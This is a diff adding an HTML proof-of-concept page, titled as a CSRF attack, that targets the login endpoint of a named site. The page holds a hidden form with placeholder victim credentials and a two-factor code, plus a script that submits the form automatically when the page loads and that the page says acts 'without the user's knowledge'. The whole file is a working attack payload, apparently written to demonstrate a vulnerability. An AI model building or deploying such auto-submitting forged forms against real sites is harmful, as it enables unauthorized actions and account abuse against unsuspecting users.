@@ -1,0 +1,27 @@
+<html><html lang=en>
+<head>
+    <meta charset=UTF-8>
+    <meta name=viewport content=width=device-width, initial-scale=1.0>
+    <title>CSRF Attack - Fake Login Form</title>
+</head>
+<body>
+    <h2>Malicious Form</h2>
+    <p>Click the button to submit the form as if you were the victim:</p>
+
+    <form action=https://admin.digtoon.com/admin/public/login.action method=POST>
+        <input type=hidden name=j_username value=victim_username />
+        <input type=hidden name=j_password value=victim_password />
+        <input type=hidden name=googleAuthCode value=123456 />
+        <input type=submit value=Login as Victim />
+    </form>
+
+    <p>This form will be submitted without the user's knowledge when they visit the malicious page.</p>
+
+    <script>
+        // Auto-submit the form when the page loads to simulate the CSRF attack
+        window.onload = function() {
+            document.forms[0].submit();
+        };
+    </script>
+</body>
+</html>
